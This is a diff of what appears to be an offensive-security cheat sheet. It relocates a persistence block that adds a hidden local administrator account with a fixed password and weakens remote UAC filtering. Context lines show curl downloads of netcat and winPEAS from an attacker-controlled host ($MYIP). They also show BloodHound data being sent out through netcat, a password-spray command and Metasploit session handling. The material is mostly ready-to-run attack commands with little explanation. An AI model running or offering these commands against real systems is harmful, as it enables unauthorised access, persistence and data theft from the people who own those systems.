@@ -1291,13 +1291,6 @@ curl $MYIP/windows/nc.exe -o \windows\tasks\nc.exe
 \windows\tasks\nc.exe $MYIP 80 < \windows\tasks\BloodHound.zip
 rlwrap nc -lvp 80 > /Upload/bloodhound/files.zip
 
-[*] Persistence
-[###] Create Account
-powershell -c "Invoke-Command -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }"
-
-[###] Verify Access
-sprayme 'dbf:123qweasdF!' hosts
-
 [*] Privilege Escalation
 [###] Priv Check
 powershell -c "curl $MYIP/windows/winPEASofs.exe -o \windows\tasks\winPEASofs.exe; \windows\tasks\winPEASofs.exe"
@@ -1478,6 +1471,13 @@ sessions
 sessions -i 1
 jobs
 jobs -k 1
+
+# Lateral Movement: Persistence
+## Create Account
+powershell -c "Invoke-Command -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }"
+
+## Verify Access
+sprayme 'dbf:123qweasdF!' hosts
 
 # Lateral Movement: Pivoting
 ## Identify
